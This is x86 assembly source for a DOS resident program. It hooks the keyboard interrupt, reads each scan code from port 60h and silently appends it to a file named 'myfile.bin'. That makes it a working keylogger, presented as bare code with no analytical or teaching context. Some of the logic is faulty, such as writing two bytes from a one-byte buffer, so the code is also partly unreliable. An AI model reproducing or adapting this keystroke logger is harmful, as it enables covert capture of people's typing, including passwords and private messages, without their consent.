.model tiny
.code
org 100h

Begin:
  jmp Install

Old09h dd ?
FName db 'myfile.bin',0
Max = 0
Count dw 0
flag dw 0
position dw 0
add_position:

  mov bx, position
  add bx, 1
  mov position, bx
  jmp Write_not_open

Buf db 1h dup(?)

New09h:
  push ds
  push cs
  pop ds
  
  push ax
  push bx
  in al,60h

  
  mov bx,Count
  mov Buf[bx],al
  inc Count
  cmp bx,Max
  jne BufNotFull
  
  push cx
  push dx
  
  cmp flag, 0
  jne Write
  mov ah,3ch
  mov cx,1
  mov dx,offset FName
  mov flag,1
  int 21h
  jmp Write_not_open
  
  Write:
  mov dx,offset FName
  mov al, 1
  mov ah, 3dh
  int 21h
  jmp add_position
  
  Write_not_open:
  mov bx,ax
  mov ah,42h
  mov al,0
  mov cx,0
  mov dx, position
  int 21h
  ;mov bx,ax
  MOV CX,2h
  MOV DX,offset Buf
  MOV ah,40h
  int 21h
  mov ah,3eh
  int 21h
  pop dx
  pop cx
  mov Count,0
  
BufNotFull:
  pop bx
  pop ax
  pop ds
  jmp DWORD PTR cs:Old09h
  
ResSize = $ - Begin

Install:
  mov ax,3509h
  int 21h
  mov WORD PTR Old09h,bx
  mov WORD PTR Old09h+2,es
  mov ax,2509h
  mov dx,offset New09h
  int 21h
  
  mov ax,3100h
  mov dx,(ResSize+10fh)/16
  int 21h
  
 
end Begin